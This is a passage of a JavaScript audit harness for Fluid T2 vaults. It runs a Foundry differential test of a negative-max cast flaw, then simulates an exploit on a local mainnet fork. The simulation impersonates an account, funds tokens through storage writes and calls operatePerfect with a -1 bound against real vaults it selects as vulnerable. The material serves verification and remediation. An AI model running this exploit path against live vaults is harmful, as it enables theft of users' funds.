        emit log_named_int("FIRST_DIVERGENT_T0", firstA);
        emit log_named_int("FIRST_DIVERGENT_T1", firstB);
        emit log_named_uint("VULNERABLE_ACCEPTS_FIRST", p.acceptsVulnerableT2(firstA, firstB) ? 1 : 0);
        emit log_named_uint("PATCHED_ACCEPTS_FIRST", p.acceptsPatchedT2(firstA, firstB) ? 1 : 0);
        emit log_named_uint("VULN_CAST_T1_MIN_IS_UINT_MAX", p.castToken1(-1) == type(uint256).max ? 1 : 0);
        require(divergentPairs == 0 || (firstA > 0 && firstB <= 0), "divergence outside positive-t0/nonpositive-t1");
    }

    function testFuzz_divergenceShape(int256 t0, int256 t1) public view {
        if (_divergent(t0, t1)) {
            require(t0 > 0 && t1 <= 0, "divergence outside positive-t0/nonpositive-t1");
        }
    }

    function testFuzz_acceptanceCongruenceElsewhere(int256 t0, int256 t1) public view {
        bool vT2 = p.acceptsVulnerableT2(t0, t1);
        bool qT2 = p.acceptsPatchedT2(t0, t1);
        if (vT2 == qT2) { return; }
        require(t0 > 0 && t1 <= 0, "divergence outside positive-t0/nonpositive-t1");
    }
}
`;
}

function runForge(cwd, args, timeoutMs) {
  const res = spawnSync(FORGE, args, {
    cwd,
    env: { ...process.env, FOUNDRY_OFFLINE: "true" },
    encoding: "utf8",
    timeout: Math.max(1000, timeoutMs),
    windowsHide: true,
    maxBuffer: 64 * 1024 * 1024,
  });
  const out = `${res.stdout || ""}\n${res.stderr || ""}`;
  return { status: res.status, signal: res.signal, error: res.error ? String(res.error.code || res.error.message) : null, out };
}

function parseForgeLogs(out) {
  const logs = {};
  const re = /(?:^|\s)([A-Z][A-Z0-9_]{2,}):\s*(-?\d+)\s*$/gm;
  let m;
  while ((m = re.exec(out)) !== null) logs[m[1]] = m[2];
  const passed = /(\d+)\s+passed/.exec(out);
  const failed = /(\d+)\s+failed/.exec(out);
  const suiteOk = /Suite result: ok\b/.test(out);
  return { logs, passedTests: passed ? Number(passed[1]) : null, failedTests: failed ? Number(failed[1]) : null, suiteOk };
}

function stageForgeDifferential() {
  const pred = stagePredicateDiff();
  const out = { verdict: "INSUFFICIENT_EVIDENCE", derivedHarness: null, treeHarnessCorroboration: {}, witness: null, divergenceReached: false };
  if (!fs.existsSync(FORGE)) { out.verdict = "INCONCLUSIVE_FORGE_MISSING"; return out; }

  // derived minimal unit reproduction
  fs.mkdirSync(path.join(SCRATCH, "src"), { recursive: true });
  fs.mkdirSync(path.join(SCRATCH, "test"), { recursive: true });
  const forgeStd = path.join(ROOT, "remediations", "fluid-vaultt2-t4-r2", "lib", "forge-std", "src").replace(/\\/g, "/");
  fs.writeFileSync(path.join(SCRATCH, "foundry.toml"),
    `[profile.default]\nsrc = "src"\ntest = "test"\nout = "out"\nlibs = []\nsolc = "0.8.21"\nevm_version = "cancun"\nremappings = ["forge-std/=${forgeStd}/"]\n`, "utf8");
  fs.writeFileSync(path.join(SCRATCH, "src", "FluidNegativeMaxPredicate.sol"), buildDifferentialHarness(pred), "utf8");
  fs.writeFileSync(path.join(SCRATCH, "test", "Differential.t.sol"), buildDifferentialTest(), "utf8");
  const derived = runForge(SCRATCH, ["test", "-vv"], Math.min(180000, Math.max(5000, HARD_DEADLINE - Date.now())));
  const parsed = parseForgeLogs(derived.out);
  const divergentPairs = parsed.logs.DIVERGENT_PAIR_COUNT !== undefined ? Number(parsed.logs.DIVERGENT_PAIR_COUNT) : null;
  const firstT0 = parsed.logs.FIRST_DIVERGENT_T0 !== undefined ? parsed.logs.FIRST_DIVERGENT_T0 : null;
  const firstT1 = parsed.logs.FIRST_DIVERGENT_T1 !== undefined ? parsed.logs.FIRST_DIVERGENT_T1 : null;
  out.derivedHarness = {
    path: SCRATCH,
    provenance: pred.divergences.map((d) => ({ type: d.type, targetFileLine: d.targetFileLine, patchedFileLine: d.patchedFileLine, vulnerableExpr: d.vulnerableExpr, patchedExpr: d.patchedExpr })),
    forgeStatus: derived.status,
    forgeError: derived.error,
    passedTests: parsed.passedTests,
    failedTests: parsed.failedTests,
    suiteOk: parsed.suiteOk,
    divergentPairCount: divergentPairs,
    fuzzShapeViolations: (parsed.suiteOk && parsed.failedTests === 0) ? 0 : null,
    witness: (firstT0 !== null && firstT1 !== null) ? {
      colToken0MinMax: firstT0, colToken1MinMax: firstT1,
      vulnerableAccepts: Number(parsed.logs.VULNERABLE_ACCEPTS_FIRST) === 1,
      patchedAccepts: Number(parsed.logs.PATCHED_ACCEPTS_FIRST) === 1,
      vulnCastT1MinIsUintMax: Number(parsed.logs.VULN_CAST_T1_MIN_IS_UINT_MAX) === 1,
    } : null,
  };
  const derivedOk = parsed.suiteOk && parsed.failedTests === 0 && divergentPairs !== null && divergentPairs > 0 && out.derivedHarness.witness
    && out.derivedHarness.witness.vulnerableAccepts === true && out.derivedHarness.witness.patchedAccepts === false;
  if (derivedOk) out.divergenceReached = true;

  // corroboration: run each tree's own pre-existing audit harness under forge (compiled from that
  // tree's contracts). This writes only build artifacts/out inside the checkout; source is untouched.
  const runTreeHarness = (spec, logPath) => {
    try {
      const cwd = path.join(ROOT, spec.dir);
      if (!fs.existsSync(path.join(cwd, "test/foundry/critical"))) return { state: "HARNESS_DIR_MISSING" };
      const remaining = HARD_DEADLINE - Date.now();
      if (remaining < 60000) return { state: "SKIPPED_DEADLINE" };
      const r = runForge(cwd, [
        "test", "--match-contract", spec.contract, "--match-test", `${spec.test}|${spec.extraTest}`, "-vv",
        "--remappings", "@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/",
        "--remappings", "@openzeppelin/contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/",
      ], Math.min(TREE_HARNESS_TIMEOUT_MS, remaining));
      fs.writeFileSync(logPath, r.out, "utf8");
      const parsedTree = parseForgeLogs(r.out);
      const okTree = parsedTree.suiteOk && parsedTree.failedTests === 0 && (parsedTree.passedTests || 0) > 0;
      return {
        state: okTree ? "RAN_OK" : (r.error === "ETIMEDOUT" ? "INCONCLUSIVE_TREE_HARNESS_TIMEOUT" : "INCONCLUSIVE_TREE_HARNESS_FAILED"),
        forgeStatus: r.status, passedTests: parsedTree.passedTests, failedTests: parsedTree.failedTests,
        logs: parsedTree.logs, logPath: path.relative(ROOT, logPath).replace(/\\/g, "/"),
      };
    } catch (e) {
      return { state: `INCONCLUSIVE_TREE_HARNESS_${String(e && e.code ? e.code : e && e.message) || "FAILURE"}` };
    }
  };
  out.treeHarnessCorroboration.vulnerable = runTreeHarness(TIER_HARNESS.vulnerable, TREE_HARNESS_LOG_VULN);
  out.treeHarnessCorroboration.patched = runTreeHarness(TIER_HARNESS.patched, TREE_HARNESS_LOG_PATCHED);

  if (out.divergenceReached) out.verdict = "PASS_DIVERGENCE_CONFIRMED";
  else if (derived.status !== 0) out.verdict = "INCONCLUSIVE_FORGE_HARNESS_FAILED";
  else out.verdict = "INSUFFICIENT_EVIDENCE";
  return out;
}

// ---------------------------------------------------------------------------
// stage c  live-fork liquidate entry on a fresh finalized pin
// ---------------------------------------------------------------------------
const NATIVE_SENTINEL = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
// The near/at-LT row the organic (pre-rerun) artifacts already staged for stage d. The targeted
// rerun must use a DIFFERENT near/at-LT row so a token-level revert observed there is not simply
// re-observed on the same address.
const PREVIOUSLY_PROBED_VAULT = "0x43d1ca906c72f09d96291b4913d7255e241f428d";
// Supply-token classes that are NOT usable for the bounded storage-funded stage-d simulation.
// On these the honest baseline quote can revert at the ERC20 safe-transfer layer
// (FluidSafeTransferError 0xdee51a8a) because the token data is exotic; that is token
// data-dependence, not the vault predicate under test, so such rows are rejected up front.
// StaticAToken (stata* / Aave aToken-share wrappers) and the sUSDS/sUSDe savings wrappers are
// explicitly listed as excluded classes.
const EXOTIC_SUPPLY_TOKENS = {
  "0xd8b27cf359b7d15710a5be299af6e7bf904984c2": "Aave StaticAToken (stata* class; rebasing aToken share)",
  "0xa3931d71877c0e7a3148cb7eb4463524fec27fbd": "sUSDS savings wrapper (rebasing savings class)",
  "0x9d39a5de30e57443bff2a8307a4256c8797a3497": "sUSDe savings wrapper (accruing savings class)",
};
// Curated plain-transfer confidence for known mainnet supply tokens (higher = more certain the
// transfer is a plain 1:1 move with no fee-on-transfer/rebasing/hook behaviour). Used only to rank
// the accepted near/at-LT candidates; the on-fork transfer/quote probe is the arbiter.
const PLAIN_TRANSFER_CONFIDENCE = {
  "0x4c9edd5852cd905f086c759e8383e09bff1e68b3": 3, // USDe (non-rebasing ERC20, bool return)
  "0xdac17f958d2ee523a2206206994597c13d831ec7": 3, // USDT (void return; handled by the tree's SafeTransfer)
  "0xcbb7c0000ab88b473b1f5afd9ef808440eed33bf": 3, // cbBTC
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 3, // WBTC
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 3, // USDC
  "0xc139190f447e929f090edeb554d95abb8b18ac1c": 2, // USDtb
  "0x8236a87084f8b84306f72007f36f2618a5634494": 2, // LBTC
  "0x657e8c867d8b37dcc18fa4caead9c45eb088c642": 2, // eBTC
  "0xf1c9acdc66974dfb6decb12aa385b9cd01190e38": 2, // osETH
  "0x917cee801a67f933f2e6b33fc0cd1ed2d5909d88": 2, // weETHs
  "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0": 2, // wstETH
};
const SUPPLY_TOKEN_LABELS = {
  "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee": "native-ETH",
  "0x4c9edd5852cd905f086c759e8383e09bff1e68b3": "USDe",
  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDC",
  "0xcbb7c0000ab88b473b1f5afd9ef808440eed33bf": "cbBTC",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTC",
  "0xc139190f447e929f090edeb554d95abb8b18ac1c": "USDtb",
  "0x8236a87084f8b84306f72007f36f2618a5634494": "LBTC",
  "0x657e8c867d8b37dcc18fa4caead9c45eb088c642": "eBTC",
  "0xf1c9acdc66974dfb6decb12aa385b9cd01190e38": "osETH",
  "0x917cee801a67f933f2e6b33fc0cd1ed2d5909d88": "weETHs",
  "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0": "wstETH",
};
const isNativeSupply = (a) => String(a || "").toLowerCase() === NATIVE_SENTINEL;
const tokenLabel = (a) => SUPPLY_TOKEN_LABELS[String(a || "").toLowerCase()] || String(a || "").slice(0, 10);

function classifySupplyToken(addr) {
  const a = String(addr || "").toLowerCase();
  if (!a) return { tokenClass: "MISSING", reason: "scan row has no supply token address" };
  if (a === NATIVE_SENTINEL) return { tokenClass: "NATIVE", reason: "native-ETH sentinel: not an ERC20 and not storage-fundable" };
  if (EXOTIC_SUPPLY_TOKENS[a]) return { tokenClass: "EXOTIC", reason: EXOTIC_SUPPLY_TOKENS[a] };
  return { tokenClass: "PLAIN", reason: `plain-transfer ERC20 assumed (${tokenLabel(a)}); confirmed on-fork for the chosen row` };
}

function selectRows() {
  if (!fs.existsSync(SCAN_JSON)) fail("SCAN_ARTIFACT_MISSING");
  const scan = JSON.parse(fs.readFileSync(SCAN_JSON, "utf8"));
  const econ = fs.existsSync(ECONOMICS_JSON) ? JSON.parse(fs.readFileSync(ECONOMICS_JSON, "utf8")) : { rows: [] };
  const econByVault = new Map((econ.rows || []).map((r) => [String(r.vault).toLowerCase(), r]));
  const chains = Array.isArray(scan.chains) ? scan.chains : [];
  const chain1 = chains.find((c) => Number(c.chainId) === 1) || chains[0];
  if (!chain1) fail("NO_ELIGIBLE_ROWS");
  const vaults = Array.isArray(chain1.vaults) ? chain1.vaults : [];
  const t2 = vaults.filter((v) => Number(v.typeNumber) === 2 && v.negativemaxLens && v.negativemaxLens.negativemaxSemantics === "vulnerable-per-pin");
  const pick = (v) => {
    const e = econByVault.get(String(v.vault).toLowerCase()) || {};
    return {
      chainId: Number(chain1.chainId),
      vault: v.vault, vaultId: v.vaultId,
      typeLabel: v.typeLabel, typeNumber: Number(v.typeNumber),
      implementationLogic: v.implementationLogic,
      liquidationThresholdBps: v.liquidationThresholdBps,
      aggregateLtvBps: v.ltPosture ? v.ltPosture.aggregateLtvBps : null,
      ltReadiness: v.ltPosture ? v.ltPosture.ltReadiness : null,
      supplyToken0: v.supplyToken0, supplyToken1: v.supplyToken1,
      borrowToken0: v.borrowToken0,
      oracle: e.oracle || null, debtToken: e.debtToken || null, penaltyBps: v.liquidationPenaltyBps,
      colPerDebtLiquidateRaw: e.colPerDebtLiquidateRaw || null,
      negativemaxSemantics: v.negativemaxLens.negativemaxSemantics,
      scanPin: chain1.pin ? { number: chain1.pin.number, hash: chain1.pin.hash } : null,
      source: "reports/raw/fast/fluid-l.json",
    };
  };
  const nearLt = t2.find((v) => v.ltPosture && (v.ltPosture.ltReadiness === "NEAR_LT" || v.ltPosture.ltReadiness === "AT_OR_ABOVE_LT"));
  const healthy = t2.find((v) => v.ltPosture && v.ltPosture.ltReadiness === "BELOW_LT");
  if (!nearLt || !healthy) fail("NO_ELIGIBLE_ROWS");
  // stage d needs a fork-qualifiable + storage-fundable near/at-LT row whose BOTH supply tokens are
  // plain-transfer ERC20 (no native sentinel, no staticAToken/savings/rebasing exotic class) and that
  // is DIFFERENT from the row the organic artifacts already staged. Native-ETH sentinel tokens have no
  // code (they break qualify()) and cannot be funded by a mapping-key storage write; exotic-class
  // tokens can revert the honest baseline quote at the ERC20 layer (FluidSafeTransferError 0xdee51a8a),
  // which is data-dependence, not the vault predicate. Accepted candidates are ranked by plain-transfer
  // confidence so the most-certainly-plain pair is chosen.
  const nearAtLt = t2.filter((v) => v.ltPosture && (v.ltPosture.ltReadiness === "NEAR_LT" || v.ltPosture.ltReadiness === "AT_OR_ABOVE_LT"));
  const exploitCandidates = nearAtLt.map((v) => {
    const c0 = classifySupplyToken(v.supplyToken0);
    const c1 = classifySupplyToken(v.supplyToken1);
    const conf0 = PLAIN_TRANSFER_CONFIDENCE[String(v.supplyToken0).toLowerCase()] || 1;
    const conf1 = PLAIN_TRANSFER_CONFIDENCE[String(v.supplyToken1).toLowerCase()] || 1;
    const plain = c0.tokenClass === "PLAIN" && c1.tokenClass === "PLAIN";
    const previouslyProbed = String(v.vault).toLowerCase() === PREVIOUSLY_PROBED_VAULT;
    const accepted = plain && !previouslyProbed;
    const pairLabel = `${tokenLabel(v.supplyToken0)}/${tokenLabel(v.supplyToken1)}`;
    const reason = !plain
      ? `REJECTED: token0=${c0.tokenClass} (${tokenLabel(v.supplyToken0)}; ${c0.reason}); token1=${c1.tokenClass} (${tokenLabel(v.supplyToken1)}; ${c1.reason})`
      : previouslyProbed
        ? `REJECTED: ${pairLabel} is the row the organic artifacts already staged; a different near/at-LT row is required for the rerun`
        : `ACCEPTED: ${pairLabel} both plain-transfer ERC20 (plain-confidence ${Math.min(conf0, conf1)})`;
    return {
      vault: v.vault, vaultId: v.vaultId, ltReadiness: v.ltPosture.ltReadiness,
      supplyToken0: v.supplyToken0, supplyToken1: v.supplyToken1,
      supplyToken0Label: tokenLabel(v.supplyToken0), supplyToken1Label: tokenLabel(v.supplyToken1),
      token0Class: c0.tokenClass, token1Class: c1.tokenClass,
      plainConfidence: Math.min(conf0, conf1), accepted, previouslyProbed, reason,
      _row: v,
    };
  });
  const acceptedCandidates = exploitCandidates.filter((c) => c.accepted)
    .sort((a, b) => b.plainConfidence - a.plainConfidence || String(a.vault).localeCompare(String(b.vault)));
  const chosen = acceptedCandidates[0] || null;
  const fallback = nearAtLt.find((v) => !isNativeSupply(v.supplyToken0) && !isNativeSupply(v.supplyToken1)) || null;
  const exploitRow = chosen ? chosen._row : fallback;
  return {
    nearLt: pick(nearLt), healthy: pick(healthy),
    exploit: exploitRow ? pick(exploitRow) : null,
    exploitSelection: chosen
      ? { vault: chosen.vault, vaultId: chosen.vaultId, supplyToken0Label: chosen.supplyToken0Label, supplyToken1Label: chosen.supplyToken1Label, accepted: true, plainConfidence: chosen.plainConfidence, reason: chosen.reason }
      : { vault: exploitRow ? exploitRow.vault : null, accepted: false, reason: "NO_PLAIN_NEAR_AT_LT_ROW: no plain-transfer near/at-LT candidate accepted; see exploitCandidates" },
    exploitCandidates: exploitCandidates.map(({ _row, ...rest }) => rest),
    exploitSubstituted: Boolean(exploitRow && exploitRow.vault.toLowerCase() !== nearLt.vault.toLowerCase()),
    scanHead: chain1.pin || null, scannedAt: scan.scannedAt, chainLabel: chain1.label, totalT2NegMax: t2.length,
  };
}

async function stageLiveFork(local, backing, rows) {
  const out = { verdict: "INSUFFICIENT_EVIDENCE", rows: [], pin: backing.pin, pinHash: backing.pinHash };
  const factoryCode = await rpc(local, "eth_getCode", [FACTORY_CHAIN1, "latest"]);
  out.factory = { address: FACTORY_CHAIN1, codePresent: factoryCode !== "0x" };
  const perRow = [];
  for (const row of rows) {
    const rec = {
      role: row.vault === rows[0].vault ? "near_at_lt_negative_max" : "healthy_same_type",
      vault: row.vault, vaultId: row.vaultId, typeLabel: row.typeLabel, ltReadiness: row.ltReadiness,
      aggregateLtvBps: row.aggregateLtvBps, liquidationThresholdBps: row.liquidationThresholdBps,
      implementationLogic: row.implementationLogic, pin: backing.pin, pinHash: backing.pinHash,
    };
    rec.vaultCodePresent = (await rpc(local, "eth_getCode", [row.vault, "latest"])) !== "0x";
    const slot = await rpc(local, "eth_getStorageAt", [row.vault, EIP1967_IMPL_SLOT, "latest"]);
    rec.eip1967Slot = (typeof slot === "string" && /^0x[0-9a-f]{64}$/i.test(slot)) ? slot : null;
    rec.eip1967Class = rec.eip1967Slot && /^0x0{64}$/i.test(rec.eip1967Slot) ? "ZERO_NOT_PROXY" : "UNEXPECTED";
    if (row.implementationLogic && out.factory.codePresent) {
      const impl = await tryCall(local, FACTORY_CHAIN1, IFACE.factory.encodeFunctionData("isVaultDeploymentLogic", [row.implementationLogic]), "latest");
      rec.isVaultDeploymentLogic = impl.ok ? Boolean(IFACE.factory.decodeFunctionResult("isVaultDeploymentLogic", impl.result)[0]) : null;
    }
    // token decimals unit guard
    const t0 = row.supplyToken0, t1 = row.supplyToken1;
    const d0 = t0 ? await readUint(local, t0, "decimals") : null;
    const d1 = t1 ? await readUint(local, t1, "decimals") : null;
    rec.token0Decimals = d0 === null ? null : d0.toString();
    rec.token1Decimals = d1 === null ? null : d1.toString();

    const debtQ = 1000n; // tiny bounded debt amount; read-only eth_call
    const colPerUnitDebt = row.colPerDebtLiquidateRaw ? BigInt(row.colPerDebtLiquidateRaw) : ONE;
    const data = IFACE.vault.encodeFunctionData("liquidate", [debtQ, colPerUnitDebt, ONE, ONE, EOA, false]);
    const liq = await tryCall(local, row.vault, data, "latest");
    rec.liquidateCall = {
      signature: "liquidate(uint256,uint256,uint256,uint256,address,bool)",
      args: { debtAmt: debtQ.toString(), colPerUnitDebt: colPerUnitDebt.toString(), token0ColAmtPerUnitShares: ONE.toString(), token1ColAmtPerUnitShares: ONE.toString(), to: EOA, absorb: false },
      reverted: !liq.ok,
      revertData: liq.revertData || null,
      revertDecoded: liq.ok ? null : decodeRevert(liq.revertData),
      returns: liq.ok ? liq.result : null,
    };
    rec.failClosed = !liq.ok;
    perRow.push(rec);
  }
  out.rows = perRow;
  const healthy = perRow.find((r) => r.role === "healthy_same_type");
  const nearLt = perRow.find((r) => r.role === "near_at_lt_negative_max");
  const healthyFailClosed = Boolean(healthy && healthy.failClosed);
  const codesOk = perRow.every((r) => r.vaultCodePresent && r.eip1967Class === "ZERO_NOT_PROXY");
  out.checks = {
    allVaultCodePresent: perRow.every((r) => r.vaultCodePresent),
    allZeroNotProxy: perRow.every((r) => r.eip1967Class === "ZERO_NOT_PROXY"),
    allImplementationBound: perRow.every((r) => r.isVaultDeploymentLogic === true),
    healthyFailClosed,
    nearLtObservation: nearLt ? { reverted: nearLt.liquidateCall.reverted, decoded: nearLt.liquidateCall.revertDecoded } : null,
  };
  out.verdict = (!codesOk) ? "INCONCLUSIVE_PIN_SURFACE_MISMATCH"
    : healthyFailClosed ? "PASS_LIVE_ENTRY_ENTRYPOINTS_BOUND_HEALTHY_FAILCLOSED"
    : "INCONCLUSIVE_HEALTHY_NOT_FAILCLOSED";
  return out;
}

// ---------------------------------------------------------------------------
// stage d  bounded fork-level exploit simulation (impersonation-local only)
// ---------------------------------------------------------------------------
async function fundToken(local, token, eoa, amount) {
  for (let slot = 0; slot < 60; slot += 1) {
    const key = keccak256(AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [eoa, slot]));
    await rpc(local, "anvil_setStorageAt", [token, key, word(amount)]);
    const bal = await readUint(local, token, "balanceOf", [eoa]);
    if (bal !== null && bal >= amount) return { ok: true, slot };
  }
  return { ok: false };
}

async function readString(local, addr, fn) {
  const r = await tryCall(local, addr, IFACE.erc20.encodeFunctionData(fn, []), "latest");
  if (!r.ok) return null;
  try { return String(IFACE.erc20.decodeFunctionResult(fn, r.result)[0]); } catch (_) { return null; }
}

// Per-candidate selector check on the fresh stage-d fork: fund the impersonated EOA by storage write,
// approve the candidate vault, verify a simulated plain 1:1 transfer, then staticCall the honest
// positive-max baseline quote. The baseline revert selector is the discriminator for token-level
// data-dependence (FluidSafeTransferError 0xdee51a8a). Cheap, no upstream forwarding.
async function probeCandidate(local, cand, backing, chosenVault) {
  const rec = {
    vault: cand.vault, vaultId: cand.vaultId, ltReadiness: cand.ltReadiness,
    supplyToken0: cand.supplyToken0, supplyToken1: cand.supplyToken1,
    supplyToken0Label: cand.supplyToken0Label, supplyToken1Label: cand.supplyToken1Label,
    token0Class: cand.token0Class, token1Class: cand.token1Class,
    acceptedByClass: cand.accepted, isChosenRow: String(cand.vault).toLowerCase() === String(chosenVault || "").toLowerCase(),
    pin: backing.pin, pinHash: backing.pinHash,
  };
  if (!cand.accepted) { rec.selectorCheck = "SKIPPED_REJECTED_BY_CLASS"; return rec; }
  try {
    rec.token0CodePresent = (await rpc(local, "eth_getCode", [cand.supplyToken0, "latest"])) !== "0x";
    rec.token1CodePresent = (await rpc(local, "eth_getCode", [cand.supplyToken1, "latest"])) !== "0x";
    rec.symbol0 = await readString(local, cand.supplyToken0, "symbol");
    rec.symbol1 = await readString(local, cand.supplyToken1, "symbol");
    if (!rec.token0CodePresent || !rec.token1CodePresent) { rec.selectorCheck = "SKIPPED_TOKEN_CODE_MISSING"; return rec; }
    const f0 = await fundToken(local, cand.supplyToken0, EOA, ONE * 1000n);
    const f1 = await fundToken(local, cand.supplyToken1, EOA, ONE * 1000n);
    rec.fundedToken0 = f0.ok; rec.fundedToken1 = f1.ok;
    if (!f0.ok || !f1.ok) { rec.selectorCheck = "TOKEN_FUNDING_FAILED_TOKEN_LEVEL"; return rec; }
    // plain-transfer evidence: one simulated transfer must move exactly `amt` (no fee-on-transfer/rebase skew)
    const amt = ONE / 10n;
    const before1 = await readUint(local, cand.supplyToken1, "balanceOf", [EOA_SHIFT]);
    const xfer = await sendTx(local, { from: EOA, to: cand.supplyToken1, data: IFACE.erc20.encodeFunctionData("transfer", [EOA_SHIFT, amt]), gas: quantity(120000), gasPrice: quantity(2n * 10n ** 9n) });
    const after1 = await readUint(local, cand.supplyToken1, "balanceOf", [EOA_SHIFT]);
    rec.plainTransferToken1 = (xfer.receipt && xfer.receipt.status === "0x1" && before1 !== null && after1 !== null)
      ? { moved: (after1 - before1).toString(), expected: amt.toString(), ok: (after1 - before1) === amt }
      : { moved: null, expected: amt.toString(), ok: false };
    for (const tok of [cand.supplyToken0, cand.supplyToken1]) {
      const appr = await sendTx(local, { from: EOA, to: tok, data: IFACE.erc20.encodeFunctionData("approve", [cand.vault, 2n ** 255n]), gas: quantity(120000), gasPrice: quantity(2n * 10n ** 9n) });
      if (!(appr.receipt && appr.receipt.status === "0x1")) { rec.selectorCheck = "APPROVE_FAILED_TOKEN_LEVEL"; return rec; }
    }
    const quote = await tryCallFrom(local, EOA, cand.vault, IFACE.vault.encodeFunctionData("operatePerfect", [0, 10n * ONE, SAFE_MAX, SAFE_MAX, 0, EOA]), "latest");
    if (quote.ok) {
      const dec = IFACE.vault.decodeFunctionResult("operatePerfect", quote.result);
      rec.selectorCheck = "BASELINE_OK";
      rec.baselineQuote = { ok: true, token0: String(BigInt(dec[1][1])), token1: String(BigInt(dec[1][2])) };
    } else {
      rec.baselineQuote = { ok: false, revertData: quote.revertData || null, revertDecoded: decodeRevert(quote.revertData) };
      rec.selectorObserved = quote.revertData ? quote.revertData.slice(0, 10).toLowerCase() : null;
      rec.selectorCheck = rec.selectorObserved === "0xdee51a8a" ? "BASELINE_REVERT_FLUID_SAFE_TRANSFER" : "BASELINE_REVERT";
    }
  } catch (e) {
    rec.selectorCheck = `PROBE_ERROR_${String((e && e.code) || (e && e.message) || "FAILURE")}`;
  }
  return rec;
}

async function stageExploit(local, backing, row, candidates) {
  const out = {
    verdict: "INSUFFICIENT_EVIDENCE", pin: backing.pin, pinHash: backing.pinHash,
    vault: row.vault, eoa: EOA, steps: [], quote: null, negativeMaxCall: null, accounting: null,
    candidateSelectorChecks: [],
  };
  if (!row.supplyToken0 || !row.supplyToken1) { out.verdict = "INCONCLUSIVE_MISSING_SUPPLY_TOKENS"; return out; }
  if (isNativeSupply(row.supplyToken0) || isNativeSupply(row.supplyToken1)) {
    out.verdict = "INCONCLUSIVE_NATIVE_SUPPLY_TOKEN_UNSUPPORTED_FOR_BOUNDED_FUNDING"; return out;
  }
  if (String(await rpc(local, "eth_getCode", [EOA, "latest"])) !== "0x") { out.verdict = "FAIL_EOA_HAS_CODE"; return out; }
  await rpc(local, "anvil_setBalance", [EOA, quantity(10n ** 20n)]);
  await rpc(local, "anvil_impersonateAccount", [EOA]);

  // per-candidate selector check (fresh fork, staticCall honest baseline) recorded on the artifact
  if (Array.isArray(candidates) && candidates.length) {
    for (const cand of candidates) out.candidateSelectorChecks.push(await probeCandidate(local, cand, backing, row.vault));
  }

  const shares = 10n * ONE;
  // The chosen row was already funded + approved + honest-quoted by its per-candidate probe
  // (probeCandidate). Reuse that baseline instead of repeating the setup: a second approve of the
  // same (owner, spender) pair is redundant and can revert on some ERC20s. Only when the chosen row
  // has no probe result (e.g. class-rejected fallback) do we run the inline fund/approve/quote path.
  const chosenProbe = out.candidateSelectorChecks.find((p) => String(p.vault).toLowerCase() === String(row.vault).toLowerCase());
  let baseline;
  if (chosenProbe && chosenProbe.baselineQuote) {
    baseline = chosenProbe.baselineQuote;
    out.steps.push({ step: "reuse_chosen_probe", ok: true, method: `fund+approve+baseline taken from probeCandidate (pin ${backing.pin})` });
  } else {
    const fund0 = await fundToken(local, row.supplyToken0, EOA, ONE * 1000n);
    const fund1 = await fundToken(local, row.supplyToken1, EOA, ONE * 1000n);
    out.steps.push({ step: "fund_token0", ok: fund0.ok, method: fund0.ok ? `anvil_setStorageAt:keccak(EOA,${fund0.slot})` : null });
    out.steps.push({ step: "fund_token1", ok: fund1.ok, method: fund1.ok ? `anvil_setStorageAt:keccak(EOA,${fund1.slot})` : null });
    if (!fund0.ok || !fund1.ok) { out.verdict = "INCONCLUSIVE_FUNDING_FAILED"; return out; }
    for (const tok of [row.supplyToken0, row.supplyToken1]) {
      const cur = await readUint(local, tok, "allowance", [EOA, row.vault]);
      if (cur !== null && cur >= shares) { out.steps.push({ step: `approve_${tok.slice(0, 10)}`, ok: true, skipped: "allowance already sufficient" }); continue; }
      const approveData = IFACE.erc20.encodeFunctionData("approve", [row.vault, 2n ** 255n]);
      const appr = await sendTx(local, { from: EOA, to: tok, data: approveData, gas: quantity(120000), gasPrice: quantity(2n * 10n ** 9n) });
      if (!(appr.receipt && appr.receipt.status === "0x1")) {
        const failed = await tryCallFrom(local, EOA, tok, approveData, "latest");
        out.steps.push({ step: `approve_${tok.slice(0, 10)}`, ok: false, receiptStatus: appr.receipt ? appr.receipt.status : null, revertData: failed.revertData || null, revertDecoded: failed.ok ? null : decodeRevert(failed.revertData) });
        out.verdict = "INCONCLUSIVE_APPROVE_FAILED";
        return out;
      }
      out.steps.push({ step: `approve_${tok.slice(0, 10)}`, ok: true });
    }
    const inline = await tryCallFrom(local, EOA, row.vault, IFACE.vault.encodeFunctionData("operatePerfect", [0, shares, SAFE_MAX, SAFE_MAX, 0, EOA]), "latest");
    baseline = inline.ok
      ? { ok: true, token0: String(BigInt(IFACE.vault.decodeFunctionResult("operatePerfect", inline.result)[1][1])), token1: String(BigInt(IFACE.vault.decodeFunctionResult("operatePerfect", inline.result)[1][2])) }
      : { ok: false, revertData: inline.revertData || null, revertDecoded: decodeRevert(inline.revertData) };
  }
  if (!baseline.ok) {
    const quoteDecoded = baseline.revertDecoded || decodeRevert(baseline.revertData);
    out.quote = { ok: false, revertData: baseline.revertData || null, revertDecoded: quoteDecoded };
    const tokenLevel = quoteDecoded && (quoteDecoded.name === "FluidSafeTransferError" || quoteDecoded.selector === "0xdee51a8a");
    out.reason = tokenLevel
      ? `honest baseline quote of the fresh ${row.typeLabel || "T2"} row reverts at the ERC20 safe-transfer layer (${quoteDecoded.name}(${quoteDecoded.errorName || quoteDecoded.selector})); token data-dependence, not the vault predicate under test`
      : "honest baseline quote reverted on the fresh row";
    out.verdict = tokenLevel ? "FAIL_CLOSED_DATA_DEPENDENT_TOKEN_REJECTION" : "INCONCLUSIVE_HONEST_QUOTE_REVERTED";
    return out;
  }
  const q0 = BigInt(baseline.token0);
  const q1 = BigInt(baseline.token1);
  out.quote = { ok: true, token0: q0.toString(), token1: q1.toString() };

  const neg = await tryCallFrom(local, EOA, row.vault, IFACE.vault.encodeFunctionData("operatePerfect", [0, shares, q0, -1n, 0, EOA]), "latest");
  if (!neg.ok) {
